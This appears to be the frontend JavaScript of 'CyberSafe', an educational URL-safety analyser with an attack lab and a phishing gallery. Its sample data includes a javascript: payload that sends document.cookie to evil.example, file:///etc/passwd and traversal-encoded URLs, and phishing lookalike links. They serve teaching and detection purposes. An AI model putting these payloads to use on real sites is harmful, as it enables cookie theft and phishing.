/**
 * CyberSafe — Frontend Application Logic v2.0
 * Modes: Offline Analysis
 * CYBERSAFE 2.0: Attack Lab, Phishing Gallery, Threat Feed, URL Compare, IOC, Badge
 */

// ============================================================================
// Configuration
// ============================================================================
const BASE_URL = (typeof import.meta !== 'undefined' && import.meta.env && import.meta.env.VITE_API_URL)
  ? import.meta.env.VITE_API_URL.replace(/\/$/, '')
  : '';

const API = {
  analyze: BASE_URL ? `${BASE_URL}/api/analyze` : '/api/analyze',
  badge:   BASE_URL ? `${BASE_URL}/api/badge`   : '/api/badge',
};

// ============================================================================
// DOM References
// ============================================================================
const form           = document.getElementById('analyze-form');
const urlInput       = document.getElementById('url-input');
const analyzeBtn     = document.getElementById('analyze-btn');
const qrToggleBtn    = document.getElementById('qr-toggle-btn');
const qrReaderContainer = document.getElementById('qr-reader-container');
const qrCloseBtn     = document.getElementById('qr-close-btn');

const loadingState   = document.getElementById('loading-state');
const loadingText    = document.getElementById('loading-text');
const errorState     = document.getElementById('error-state');
const errorTitle     = document.getElementById('error-title');
const errorMessage   = document.getElementById('error-message');
const resultsContainer = document.getElementById('results-container');

// Offline analysis elements
const offlineResults = document.getElementById('offline-results');
const verdictBanner  = document.getElementById('verdict-banner');
const verdictIcon    = document.getElementById('verdict-icon');
const verdictTitle   = document.getElementById('verdict-title');
const verdictRecommendation = document.getElementById('verdict-recommendation');
const scoreText      = document.getElementById('score-text');
const confidenceText = document.getElementById('confidence-text');
const anatomyGrid    = document.getElementById('anatomy-grid');
const findingsList   = document.getElementById('findings-list');
const findingsCount  = document.getElementById('findings-count');
const anatomyVisual  = document.getElementById('anatomy-visual');

// History
const historyList    = document.getElementById('history-list');
const emptyHistory   = document.getElementById('empty-history');
const clearHistoryBtn = document.getElementById('clear-history-btn');

// ============================================================================
// State
// ============================================================================
let qrScanner   = null;
let scanHistory = [];

// ============================================================================
// Attack Lab Data (20 labs, 5 categories)
// ============================================================================
const ATTACK_LABS = [
  // Category 1 — URL DECEPTION
  { id: 1, category: 'DECEPTION', icon: '🎭', name: 'Credential @ Trick', desc: 'Hides real destination after @', url: 'https://google.com@evil.example/login', concept: 'Text before @ is user-information, not the hostname. The actual destination is after @.' },
  { id: 2, category: 'DECEPTION', icon: '🎯', name: 'Brand Lookalike', desc: 'Substituted characters in brand name', url: 'https://paypa1-secure.verify.net/account', concept: 'Character substitution (1 for l) impersonates a trusted brand domain.' },
  { id: 3, category: 'DECEPTION', icon: '🔤', name: 'Punycode Homograph', desc: 'Unicode lookalike characters', url: 'https://xn--pple-43d.com/login', concept: 'Internationalized domain names can use characters that look identical to ASCII.' },
  { id: 4, category: 'DECEPTION', icon: '🔗', name: 'URL Shortener', desc: 'Hides destination via redirect', url: 'https://tinyurl.com/y7d3xk9p', concept: 'URL shorteners mask the true destination, common in phishing delivery.' },

  // Category 2 — DANGEROUS PAYLOADS
  { id: 5, category: 'PAYLOAD', icon: '💉', name: 'JavaScript Scheme', desc: 'Executes code in browser', url: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", concept: 'The javascript: scheme runs code directly in the browser context.' },
  { id: 6, category: 'PAYLOAD', icon: '📦', name: 'Data URI', desc: 'Embeds HTML payload in URL', url: "data:text/html,<h1>Phishing Page</h1>", concept: 'Data URIs embed inline content, bypassing domain reputation checks.' },
  { id: 7, category: 'PAYLOAD', icon: '📂', name: 'File Scheme', desc: 'Accesses local filesystem', url: 'file:///etc/passwd', concept: 'The file: scheme attempts to access the local device filesystem.' },
  { id: 8, category: 'PAYLOAD', icon: '🔐', name: 'Encoded Payload', desc: 'Percent-encoded obfuscation', url: 'https://example.com/%2F%2F..%2F..%2Fetc%2Fpasswd%2F%2F%2F', concept: 'Excessive percent-encoding hides the true path from security filters.' },

  // Category 3 — HOST & NETWORK
  { id: 9, category: 'NETWORK', icon: '🌐', name: 'Public IP Address', desc: 'Raw IP instead of domain', url: 'http://93.184.216.34/login', concept: 'Legitimate sites use domain names. Raw IPs bypass reputation systems.' },
  { id: 10, category: 'NETWORK', icon: '🏠', name: 'Private/Internal IP', desc: 'Targets private network', url: 'http://10.0.0.1/admin/config.php', concept: 'Private IPs (10.x, 192.168.x) target internal network resources.' },
  { id: 11, category: 'NETWORK', icon: '🔌', name: 'Suspicious Port', desc: 'Non-standard port number', url: 'https://example.com:8443/login', concept: 'Non-standard ports (8443, 8080) may indicate unofficial services.' },
  { id: 12, category: 'NETWORK', icon: '🔢', name: 'Obfuscated IP', desc: 'DWORD integer IP encoding', url: 'http://2130706433/admin', concept: 'Integer/hex IP encoding hides the destination from basic URL checks.' },

  // Category 4 — PHISHING PATTERNS
  { id: 13, category: 'PHISHING', icon: '🔑', name: 'Fake Login Path', desc: 'Credential harvest path', url: 'https://example-secure.com/login', concept: 'Paths like /login on unfamiliar domains may be credential harvesting pages.' },
  { id: 14, category: 'PHISHING', icon: '🪝', name: 'Credential Collection', desc: 'Password reset lure', url: 'https://accounts-verify.net/reset-password?token=abc123', concept: 'Fake password reset pages combined with brand impersonation capture credentials.' },
  { id: 15, category: 'PHISHING', icon: '✉️', name: 'Account Verification', desc: 'Email verify lure', url: 'https://verify-account.tk/email-confirm?user=victim', concept: 'Fake verification pages on suspicious TLDs (.tk) are common phishing vectors.' },
  { id: 16, category: 'PHISHING', icon: '💳', name: 'Suspicious Payment', desc: 'Billing/payment lure', url: 'https://paypal-billing.verify.net/payment', concept: 'Brand names in non-official domains with payment paths indicate phishing.' },

  // Category 5 — URL STRUCTURE
  { id: 17, category: 'STRUCTURE', icon: '📏', name: 'Excessively Long URL', desc: 'Obfuscation via length', url: 'https://legitimate-looking-site.com/page/that/goes/on/and/on/for/no/good/reason/whatsoever/because/attackers/use/long/paths/to/confuse/security/filters/and/hide/malicious/content/deep/within/the/url/structure/making/it/very/hard/to/read/or/verify/by/humans/or/simple/automated/tools/that/only/check/the/domain/name/and/not/the/full/path', concept: 'Extremely long URLs can hide malicious destinations from cursory inspection.' },
  { id: 18, category: 'STRUCTURE', icon: '🪆', name: 'Nested URL', desc: 'URL within query param', url: 'https://example.com/redirect?url=https://evil.example/phish', concept: 'URLs embedded in query parameters can redirect to malicious destinations.' },
  { id: 19, category: 'STRUCTURE', icon: '❓', name: 'Suspicious Query', desc: 'Redirect parameter abuse', url: 'https://accounts.google.com.evil.example/signin?continue=https://phish.example', concept: 'Redirect parameters combined with brand lookalikes create convincing phishing.' },
  { id: 20, category: 'STRUCTURE', icon: '@@', name: 'Multiple @ Symbols', desc: 'Multiple @ confusion', url: 'https://user@attacker.com@evil.example/login', concept: 'Multiple @ symbols confuse URL parsers. The real host follows the last @.' },
];

// ============================================================================
// Phishing Gallery Data
// ============================================================================
const PHISHING_GALLERY = [
  { technique: 'Deceptive @', example: 'https://paypal.com@evil.example/login', userSees: '"paypal.com" appears in the browser bar', actualContent: 'Destination is evil.example, not paypal.com', whyMatters: 'Browsers treat text before @ as credentials, not as the hostname.', detection: 'AT_SYMBOL_DECEPTION rule detects user-information in URL', howToStay: 'Always check the actual hostname after the @ symbol. Look at the browser\'s address bar carefully.' },
  { technique: 'Lookalike Domain', example: 'https://paypa1.com/signin', userSees: '"paypa1" looks almost identical to "paypal"', actualContent: 'Character "1" replaces "l" — this is a different domain', whyMatters: 'Character substitution is the most common domain impersonation technique.', detection: 'LOOKALIKE_HOSTNAME detects character substitution patterns', howToStay: 'Type the official URL directly. Do not click links from emails or messages.' },
  { technique: 'Punycode Homograph', example: 'https://xn--pple-43d.com', userSees: 'May appear as "apple.com" in some browsers', actualContent: 'Uses internationalized characters encoded as Punycode (xn--)', whyMatters: 'Characters from other alphabets can look identical to Latin letters.', detection: 'PUNYCODE_HOSTNAME flags IDN-encoded hostnames', howToStay: 'Check for "xn--" in URLs. Modern browsers show Punycode for mixed-script domains.' },
  { technique: 'Shortened URL', example: 'https://bit.ly/3xYzAbC', userSees: 'A short bit.ly link', actualContent: 'The real destination is hidden behind the redirect', whyMatters: 'URL shorteners are commonly abused to hide phishing destinations.', detection: 'KNOWN_URL_SHORTENER identifies shortening services', howToStay: 'Use a URL expander tool before clicking. Avoid shortened links from unknown sources.' },
  { technique: 'IP Address URL', example: 'http://93.184.216.34/banking', userSees: 'A raw IP address instead of a domain name', actualContent: 'No domain name means no SSL verification of identity', whyMatters: 'Legitimate banking and financial sites always use domain names, never raw IPs.', detection: 'IP_ADDRESS_HOST flags direct IP address usage', howToStay: 'Never enter credentials on a site identified only by its IP address.' },
  { technique: 'Fake Login', example: 'https://secure-login.example.com/google/signin', userSees: 'Path contains "google" and "signin" — looks legitimate', actualContent: 'Domain is example.com, not google.com', whyMatters: 'Attackers put brand names in paths and subdomains to create trust.', detection: 'CREDENTIAL_PATH + domain mismatch detection', howToStay: 'Always verify the root domain matches the service you expect.' },
  { technique: 'Suspicious Payment', example: 'https://paypal-payment.verify.net/billing', userSees: '"paypal" appears in the subdomain', actualContent: 'Domain is verify.net, not paypal.com', whyMatters: 'Payment page phishing targets financial credentials and card details.', detection: 'BRAND_IN_NON_OFFICIAL_DOMAIN + PAYMENT_PATH', howToStay: 'Navigate to payment sites directly by typing their URL. Never follow email links.' },
  { technique: 'Dangerous Scheme', example: "javascript:document.location='https://evil.example'", userSees: 'May appear as a clickable link', actualContent: 'Executes JavaScript code in the browser on click', whyMatters: 'JavaScript URIs can steal cookies, redirect, or modify page content.', detection: 'DANGEROUS_SCHEME flags javascript:, data:, vbscript:', howToStay: 'Never click or paste javascript: URIs. They execute code, not navigate.' },
  { technique: 'Encoded URL', example: 'https://example.com/%68%74%74%70%73%3A%2F%2Fevil.example', userSees: 'A URL with percent-encoded characters', actualContent: 'Decodes to a redirect or nested malicious URL', whyMatters: 'Encoding hides the true nature of URL components from inspection.', detection: 'EXCESSIVE_ENCODING detects high percent-encoding count', howToStay: 'Be wary of URLs with excessive %XX sequences. Decode before trusting.' },
  { technique: 'Suspicious Port', example: 'https://google.com:8080/account', userSees: 'google.com with an unusual port number', actualContent: 'Port 8080 is not the standard HTTPS port (443)', whyMatters: 'Non-standard ports might host unofficial or malicious services.', detection: 'UNUSUAL_PORT flags non-standard port numbers', howToStay: 'Legitimate major services use standard ports (80/443). Question unusual ports.' },
];

// ============================================================================
// Demo Threat Feed Data
// ============================================================================
const DEMO_THREATS = [
  { type: 'PHISHING', indicator: 'paypa1-secure.verify.net', severity: 'HIGH', source: 'DEMO', category: 'Lookalike Domain', timestamp: '2026-10-03T08:22:00Z' },
  { type: 'MALWARE', indicator: "javascript:eval(atob('...'))", severity: 'CRITICAL', source: 'DEMO', category: 'JavaScript Injection', timestamp: '2026-10-03T07:15:00Z' },
  { type: 'SCAM', indicator: 'bit.ly/urgent-account-verify', severity: 'MEDIUM', source: 'DEMO', category: 'URL Shortener', timestamp: '2026-10-03T06:45:00Z' },
  { type: 'SUSPICIOUS', indicator: '93.184.216.34/login', severity: 'MEDIUM', source: 'DEMO', category: 'IP Address Host', timestamp: '2026-10-03T05:30:00Z' },
  { type: 'PHISHING', indicator: 'google.com@evil-domain.net/signin', severity: 'HIGH', source: 'DEMO', category: 'Deceptive @', timestamp: '2026-10-03T04:12:00Z' },
];

// ============================================================================
// Initialization
// ============================================================================
document.addEventListener('DOMContentLoaded', () => {
  if (typeof lucide !== 'undefined') lucide.createIcons();

  loadHistoryFromStorage();
  renderHistory();

  form.addEventListener('submit', handleFormSubmit);
  qrToggleBtn.addEventListener('click', toggleQRScanner);
  qrCloseBtn.addEventListener('click', closeQRScanner);
  clearHistoryBtn.addEventListener('click', clearHistory);

  // Export report button
  const exportBtn = document.getElementById('export-report-btn');
  if (exportBtn) {
    exportBtn.addEventListener('click', exportReport);
  }

  // History search (sidebar)
  const historySearch = document.getElementById('history-search');
  if (historySearch) {
    historySearch.addEventListener('input', () => renderHistory(historySearch.value.trim()));
  }

  // ======== NEW FEATURE INIT ========

  // Tab Navigation
  initTabNavigation();

  // Attack Lab
  initAttackLab();

  // Phishing Gallery
  initPhishingGallery();

  // Threat Feed
  initThreatFeed();

  // URL Comparison
  initURLComparison();

  // IOC Extraction
  initIOC();

  // Badge
  initBadge();

  // Result Actions
  initResultActions();

  // Full History Tab
  initFullHistory();
});

// ============================================================================
// Tab Navigation
// ============================================================================
function initTabNavigation() {
  document.querySelectorAll('.nav-tab').forEach(tab => {
    tab.addEventListener('click', () => {
      const target = tab.getAttribute('data-tab');

      // Update active tab
      document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      // Show correct panel
      document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
      const targetPanel = document.getElementById(`${target}-tab`);
      if (targetPanel) targetPanel.classList.add('active');

      if (typeof lucide !== 'undefined') lucide.createIcons();
    });
  });
}

function switchToTab(tabId) {
  const tab = document.querySelector(`.nav-tab[data-tab="${tabId}"]`);
  if (tab) tab.click();
}

// ============================================================================
// Form Submission
// ============================================================================
async function handleFormSubmit(e) {
  e.preventDefault();
  const url = urlInput.value.trim();
  if (!url) return;

  hideError();
  hideResults();
  showLoading('Analyzing URL structure...');

  try {
    await handleAnalyze(url);
  } catch (err) {
    showError('Request Failed', getReadableError(err));
  } finally {
    hideLoading();
  }
}

function getReadableError(err) {
  const msg = err.message || '';
  if (msg.includes('Failed to fetch') || msg.includes('NetworkError')) {
    return 'Could not reach the analysis server. The backend may be starting up (free tier). Please wait 30 seconds and try again.';
  }
  if (msg.includes('timeout')) {
    return 'The request timed out. Please try again.';
  }
  if (msg.includes('rate limit') || msg.includes('429')) {
    return 'Too many requests. Please wait a moment before analyzing again.';
  }
  return msg || 'An unexpected error occurred. Please try again.';
}

// ============================================================================
// Offline Analysis
// ============================================================================
async function handleAnalyze(url) {
  const response = await fetch(API.analyze, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url }),
  });

  const data = await response.json();
  if (!response.ok || !data.success) {
    throw new Error(data.error?.message || 'Analysis failed. Please try again.');
  }

  addToHistory({
    url,
    verdict: data.analysis.verdict,
    score: data.analysis.score,
    findingCount: (data.analysis.findings || []).length,
    timestamp: Date.now(),
    mode: 'offline',
  });
  renderAnalysisResults(data.analysis);
  showResults();
  renderIOC(data.analysis);
}

// ============================================================================
// Render — Offline Analysis
// ============================================================================
function renderAnalysisResults(analysis) {
  const v = analysis.verdict;
  verdictBanner.className = `verdict-banner ${v}`;
  verdictTitle.textContent = v;
  verdictRecommendation.textContent = analysis.recommendation || '';
  scoreText.textContent   = `${analysis.score}/100`;
  confidenceText.textContent = (analysis.confidence || '').toUpperCase();

  const iconMap = { SAFE: 'shield-check', REVIEW: 'alert-circle', SUSPICIOUS: 'shield-alert' };
  verdictIcon.innerHTML = `<i data-lucide="${iconMap[v] || 'shield'}"></i>`;

  renderAnatomy(analysis);
  renderFindings(analysis.findings || [], analysis.score);
  renderRiskScoreBar(analysis.score, analysis.findings || []);
  renderNetworkTransparency();
  renderTechnicalDetails(analysis);

  // Store last analysis for export and IOC
  window._lastAnalysis = analysis;

  // Show export button
  const exportBtn = document.getElementById('export-report-btn');
  if (exportBtn) exportBtn.classList.remove('hidden');

  // Show result actions bar
  const actionsBar = document.getElementById('result-actions-bar-wrapper');
  if (actionsBar) actionsBar.classList.remove('hidden');

  if (typeof lucide !== 'undefined') lucide.createIcons();
}

// URL Anatomy with visual highlights
function renderAnatomy(analysis) {
  const p = analysis.parsed || {};

  // Visual URL decomposition bar
  const anatomyVisual = document.getElementById('anatomy-visual');
  if (anatomyVisual) {
    anatomyVisual.innerHTML = buildURLVisual(analysis);
  }

  const items = [
    { label: 'Actual Hostname', value: analysis.actual_hostname || p.hostname || 'None', flag: p.has_userinfo ? 'warn' : '' },
    { label: 'Scheme',          value: p.scheme || 'None', flag: p.scheme && !['https','http'].includes(p.scheme) ? 'warn' : '' },
    { label: 'Userinfo (@)',    value: p.has_userinfo ? '⚠ Yes — Deceptive Pattern' : 'No', flag: p.has_userinfo ? 'warn' : '' },
    { label: 'Port',            value: p.port || 'Default', flag: '' },
    { label: 'Path',            value: p.path || '/', flag: '' },
    { label: 'Query',           value: p.query || 'None', flag: '' },
    { label: 'Fragment',        value: p.fragment || 'None', flag: '' },
    { label: 'Punycode',        value: p.is_punycode ? `⚠ Yes — ${p.unicode_hostname || 'IDN'}` : 'No', flag: p.is_punycode ? 'warn' : '' },
    { label: 'URL Length',      value: `${(p.original_url || '').length} chars`, flag: (p.original_url || '').length > 100 ? 'warn' : '' },
  ];
  anatomyGrid.innerHTML = items.map(i => `
    <div class="anatomy-item${i.flag ? ' anatomy-item--' + i.flag : ''}">
      <div class="anatomy-label">${escapeHTML(i.label)}</div>
      <div class="anatomy-value">${escapeHTML(String(i.value))}</div>
    </div>`).join('');
}

// Build visual URL breakdown
function buildURLVisual(analysis) {
  const p = analysis.parsed || {};
  const url = p.original_url || '';
  if (!url) return '';

  const parts = [];

  if (p.scheme) {
    parts.push({ text: p.scheme + '://', cls: ['https','http'].includes(p.scheme) ? 'url-part--scheme-safe' : 'url-part--scheme-danger', label: 'Scheme' });
  }
  if (p.has_userinfo) {
    const atIdx = url.indexOf('@');
    const afterScheme = url.indexOf('//') + 2;
    if (atIdx > afterScheme) {
      parts.push({ text: url.slice(afterScheme, atIdx + 1), cls: 'url-part--danger', label: '⚠ Deceptive @' });
    }
  }
  if (p.hostname) {
    parts.push({ text: p.hostname, cls: p.is_punycode ? 'url-part--warn' : 'url-part--hostname', label: p.is_punycode ? '⚠ Punycode' : 'Hostname' });
  }
  if (p.port) {
    parts.push({ text: ':' + p.port, cls: 'url-part--port', label: 'Port' });
  }
  if (p.path && p.path !== '/') {
    parts.push({ text: p.path, cls: 'url-part--path', label: 'Path' });
  }
  if (p.query) {
    parts.push({ text: '?' + p.query, cls: 'url-part--query', label: 'Query' });
  }
  if (p.fragment) {
    parts.push({ text: '#' + p.fragment, cls: 'url-part--fragment', label: 'Fragment' });
  }

  if (!parts.length) {
    return `<div class="url-visual-raw font-mono">${escapeHTML(url)}</div>`;
  }

  return `<div class="url-visual">
    ${parts.map(pt => `<span class="url-part ${escapeHTML(pt.cls)}" data-label="${escapeHTML(pt.label)}">${escapeHTML(pt.text)}</span>`).join('')}
  </div>`;
}

// Risk score bar — uses ACTUAL finding scores from API
function renderRiskScoreBar(score, findings) {
  const container = document.getElementById('risk-score-breakdown');
  if (!container) return;

  const pct = Math.min(100, score);
  const colorClass = score >= 50 ? 'bar--suspicious' : score >= 20 ? 'bar--review' : 'bar--safe';

  container.innerHTML = `
    <div class="risk-score-header">
      <span class="risk-score-label">Risk Score</span>
      <span class="risk-score-value font-mono">${score}/100</span>
    </div>
    <div class="risk-bar-track">
      <div class="risk-bar-fill ${colorClass}" style="width:${pct}%"></div>
    </div>
    ${findings.length ? `
    <div class="risk-contributions">
      <div class="risk-contrib-title">Score breakdown:</div>
      ${findings.map(f => `
        <div class="risk-contrib-row">
          <span class="risk-contrib-name">${escapeHTML(f.title || f.rule_id)}</span>
          <span class="risk-contrib-badge severity-badge ${escapeHTML(f.severity)}">${escapeHTML(f.severity)}</span>
          <span class="risk-contrib-pts font-mono">+${f.score}</span>
        </div>`).join('')}
    </div>` : ''}`;
}

// Explainable findings with WHAT/WHY/ACTION
const FINDING_EXPLANATIONS = {
  'brand_impersonation': { what: 'The hostname closely resembles a trusted brand but is a different domain.', why: 'Attackers register look-alike domains to steal credentials.', action: 'Do not enter credentials. Navigate directly to the official site.' },
  'userinfo_deception': { what: 'A "@" symbol appears in the URL before the actual hostname.', why: 'Everything before "@" is treated as credentials by browsers. The real destination is after "@".', action: 'The visual hostname is fake. The actual destination follows the "@" symbol.' },
  'ip_address_host': { what: 'The URL uses a raw IP address instead of a domain name.', why: 'Legitimate services rarely use bare IPs. This can mask the true identity of the server.', action: 'Exercise caution. Verify you trust this IP address before proceeding.' },
  'url_shortener': { what: 'This URL uses a known link-shortening service that hides the real destination.', why: 'Shortened URLs are commonly used in phishing to conceal malicious destinations.', action: 'Expand the link first using a URL expander tool.' },
  'dangerous_scheme': { what: 'The URL uses a non-standard scheme (e.g., javascript:, data:).', why: 'These schemes can execute code directly in the browser when clicked.', action: 'Never click or paste this URL into a browser address bar.' },
  'punycode_hostname': { what: 'The hostname contains internationalized characters encoded as punycode.', why: 'Homograph attacks use characters from other alphabets that look identical to Latin letters.', action: 'Verify the actual Unicode characters in the hostname.' },
  'suspicious_path': { what: 'The URL path contains patterns commonly associated with phishing pages.', why: 'Paths like /login, /verify are frequently used in credential-harvesting pages.', action: 'Verify the domain is legitimate before entering any information.' },
};

function getFindingExplanation(finding) {
  if (finding.rule_id && FINDING_EXPLANATIONS[finding.rule_id]) return FINDING_EXPLANATIONS[finding.rule_id];
  const titleLower = (finding.title || '').toLowerCase();
  for (const [key, exp] of Object.entries(FINDING_EXPLANATIONS)) {
    if (titleLower.includes(key.replace(/_/g, ' ').split(' ')[0])) return exp;
  }
  return null;
}

function renderFindings(findings, totalScore) {
  findingsCount.textContent = `${findings.length} triggered`;
  if (findings.length === 0) {
    findingsList.innerHTML = `<div class="clean-slate">
      <i data-lucide="shield-check" style="width:2rem;height:2rem;color:var(--safe-text);margin-bottom:0.5rem"></i>
      <p>No structural risks or deception indicators detected.</p>
      <p style="font-size:0.85rem;margin-top:0.5rem;color:var(--text-dim)">SAFE verdict means no <em>structural</em> red flags — it does not guarantee the destination is safe.</p>
    </div>`;
    if (typeof lucide !== 'undefined') lucide.createIcons();
    return;
  }
  findingsList.innerHTML = findings.map((f, idx) => {
    const exp = getFindingExplanation(f);
    const expandId = `finding-expand-${idx}`;
    return `
    <div class="finding-card">
      <div class="finding-header">
        <span class="finding-title">${escapeHTML(f.title)}</span>
        <span class="severity-badge ${escapeHTML(f.severity)}">${escapeHTML(f.severity)}</span>
      </div>
      <div class="finding-desc">${escapeHTML(f.message)}</div>
      ${f.evidence ? `<div class="finding-evidence">Evidence: ${escapeHTML(f.evidence)}</div>` : ''}
      ${exp ? `
      <button class="finding-expand-btn" aria-expanded="false" aria-controls="${expandId}" onclick="toggleFindingExpand(this, '${expandId}')">
        <i data-lucide="chevron-down"></i> Explain this finding
      </button>
      <div class="finding-explanation hidden" id="${expandId}">
        <div class="explain-section">
          <div class="explain-label">WHAT</div>
          <div class="explain-text">${escapeHTML(exp.what)}</div>
        </div>
        <div class="explain-section">
          <div class="explain-label">WHY</div>
          <div class="explain-text">${escapeHTML(exp.why)}</div>
        </div>
        <div class="explain-section">
          <div class="explain-label">ACTION</div>
          <div class="explain-text">${escapeHTML(exp.action)}</div>
        </div>
      </div>` : ''}
    </div>`;
  }).join('');
  if (typeof lucide !== 'undefined') lucide.createIcons();
}

function toggleFindingExpand(btn, id) {
  const panel = document.getElementById(id);
  if (!panel) return;
  const expanded = btn.getAttribute('aria-expanded') === 'true';
  btn.setAttribute('aria-expanded', String(!expanded));
  panel.classList.toggle('hidden', expanded);
  const icon = btn.querySelector('svg, i[data-lucide]');
  if (icon) {
    icon.setAttribute('data-lucide', expanded ? 'chevron-down' : 'chevron-up');
    if (typeof lucide !== 'undefined') lucide.createIcons();
  }
}
window.toggleFindingExpand = toggleFindingExpand;

// ============================================================================
// Network Transparency — Phase 17
// ============================================================================
function renderNetworkTransparency() {
  const container = document.getElementById('network-transparency');
  if (!container) return;

  container.innerHTML = `
    <div class="transparency-section">
      <div class="transparency-title">Analysis performed</div>
      <div class="transparency-grid">
        <div class="transparency-row performed">
          <span class="transparency-check">✓</span>
          <span class="transparency-label">URL parsing</span>
          <span class="transparency-status">Performed</span>
        </div>
        <div class="transparency-row performed">
          <span class="transparency-check">✓</span>
          <span class="transparency-label">Hostname analysis</span>
          <span class="transparency-status">Performed</span>
        </div>
        <div class="transparency-row performed">
          <span class="transparency-check">✓</span>
          <span class="transparency-label">Pattern analysis</span>
          <span class="transparency-status">Performed</span>
        </div>
        <div class="transparency-row performed">
          <span class="transparency-check">✓</span>
          <span class="transparency-label">Risk engine</span>
          <span class="transparency-status">Performed</span>
        </div>
      </div>
    </div>
    <div class="transparency-section">
      <div class="transparency-title">Not performed (no destination contact)</div>
      <div class="transparency-grid">
        <div class="transparency-row not-performed">
          <span class="transparency-check">✗</span>
          <span class="transparency-label">DNS lookup</span>
          <span class="transparency-status">Not performed</span>
        </div>
        <div class="transparency-row not-performed">
          <span class="transparency-check">✗</span>
          <span class="transparency-label">HTTP request</span>
          <span class="transparency-status">Not performed</span>
        </div>
        <div class="transparency-row not-performed">
          <span class="transparency-check">✗</span>
          <span class="transparency-label">Redirects</span>
          <span class="transparency-status">Not followed</span>
        </div>
        <div class="transparency-row not-performed">
          <span class="transparency-check">✗</span>
          <span class="transparency-label">Destination request</span>
          <span class="transparency-status">Not performed</span>
        </div>
        <div class="transparency-row not-performed">
          <span class="transparency-check">✗</span>
          <span class="transparency-label">Cookies</span>
          <span class="transparency-status">Not accessed</span>
        </div>
        <div class="transparency-row not-performed">
          <span class="transparency-check">✗</span>
          <span class="transparency-label">Remote JavaScript</span>
          <span class="transparency-status">Not executed</span>
        </div>
      </div>
    </div>`;
}

// ============================================================================
// Technical Details collapsible — Phase 18
// ============================================================================
function renderTechnicalDetails(analysis) {
  const panel = document.getElementById('technical-details-panel');
  if (!panel) return;

  const p = analysis.parsed || {};
  const rows = [
    ['Input URL',         p.original_url || '—'],
    ['Scheme',            p.scheme || '—'],
    ['Hostname',          analysis.actual_hostname || p.hostname || '—'],
    ['Port',              p.port ? String(p.port) : 'Default'],
    ['Path',              p.path || '/'],
    ['Query',             p.query || 'None'],
    ['Fragment',          p.fragment || 'None'],
    ['Has Userinfo (@)',  p.has_userinfo ? 'Yes' : 'No'],
    ['Punycode',         p.is_punycode ? `Yes — ${p.unicode_hostname || 'IDN encoded'}` : 'No'],
    ['URL Length',        `${(p.original_url || '').length} characters`],
    ['Findings',          `${(analysis.findings || []).length} rule(s) triggered`],
    ['Rules triggered',   (analysis.findings || []).map(f => f.rule_id).join(', ') || 'None'],
  ];

  panel.innerHTML = `<table class="tech-details-table">
    ${rows.map(([k, v]) => `
      <tr>
        <td class="tech-details-key">${escapeHTML(k)}</td>
        <td class="tech-details-val font-mono">${escapeHTML(String(v))}</td>
      </tr>`).join('')}
  </table>`;
}

function toggleTechnicalDetails() {
  const btn = document.getElementById('technical-details-btn');
  const panel = document.getElementById('technical-details-panel');
  if (!btn || !panel) return;
  const expanded = btn.getAttribute('aria-expanded') === 'true';
  btn.setAttribute('aria-expanded', String(!expanded));
  panel.classList.toggle('hidden', expanded);
  btn.querySelector('.toggle-label').textContent = expanded ? 'Show Technical Details' : 'Hide Technical Details';
  const icon = btn.querySelector('svg, i[data-lucide]');
  if (icon) {
    icon.setAttribute('data-lucide', expanded ? 'chevron-down' : 'chevron-up');
    if (typeof lucide !== 'undefined') lucide.createIcons();
  }
}
window.toggleTechnicalDetails = toggleTechnicalDetails;

// ============================================================================
// Result Actions — Phase 19
// ============================================================================
function initResultActions() {
  const analyzeAnotherBtn = document.getElementById('analyze-another-btn');
  if (analyzeAnotherBtn) {
    analyzeAnotherBtn.addEventListener('click', () => {
      hideResults();
      hideError();
      urlInput.value = '';
      urlInput.focus();
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  }

  const copyResultBtn = document.getElementById('copy-result-btn');
  if (copyResultBtn) {
    copyResultBtn.addEventListener('click', () => {
      exportReport();
    });
  }
}

// ============================================================================
// Render — Security Analysis Results (legacy recon adapter — no live data)
// ============================================================================
function renderReconResults() {
  // No-op: live recon is not implemented. This stub prevents runtime errors.
}

// ============================================================================
// Security Report Export
// ============================================================================
function exportReport() {
  const a = window._lastAnalysis;
  if (!a) return;

  const p = a.parsed || {};
  const lines = [
    '═══════════════════════════════════════════',
    '  CyberSafe — Security Analysis Report',
    '═══════════════════════════════════════════',
    `  Generated : ${new Date().toISOString()}`,
    `  URL       : ${p.original_url || ''}`,
    `  Verdict   : ${a.verdict}`,
    `  Risk Score: ${a.score}/100`,
    `  Confidence: ${(a.confidence || '').toUpperCase()}`,
    '───────────────────────────────────────────',
    '  RECOMMENDATION',
    `  ${a.recommendation || ''}`,
    '───────────────────────────────────────────',
    '  URL STRUCTURE',
    `  Hostname : ${a.actual_hostname || p.hostname || '—'}`,
    `  Scheme   : ${p.scheme || '—'}`,
    `  Path     : ${p.path || '/'}`,
    `  Userinfo : ${p.has_userinfo ? 'YES — Deceptive pattern detected' : 'None'}`,
    `  Punycode : ${p.is_punycode ? 'YES — ' + (p.unicode_hostname || 'IDN') : 'No'}`,
    '───────────────────────────────────────────',
    `  FINDINGS (${(a.findings || []).length} total)`,
  ];

  (a.findings || []).forEach((f, i) => {
    lines.push(`  ${i + 1}. [${f.severity.toUpperCase()}] ${f.title} (+${f.score})`);
    lines.push(`     ${f.message}`);
    if (f.evidence) lines.push(`     Evidence: ${f.evidence}`);
  });

  lines.push('───────────────────────────────────────────');
  lines.push('  This URL was analyzed as text.');
  lines.push('  CyberSafe did not visit or fetch the destination.');
  lines.push('═══════════════════════════════════════════');

  const report = lines.join('\n');
  const btn = document.getElementById('export-report-btn');
  navigator.clipboard.writeText(report).then(() => {
    if (btn) { const orig = btn.innerHTML; btn.textContent = '✓ Copied!'; setTimeout(() => { btn.innerHTML = orig; if (typeof lucide !== 'undefined') lucide.createIcons(); }, 2000); }
  }).catch(() => { showReportFallback(report); });
}

function showReportFallback(report) {
  let modal = document.getElementById('report-modal');
  if (!modal) {
    modal = document.createElement('div'); modal.id = 'report-modal'; modal.className = 'report-modal';
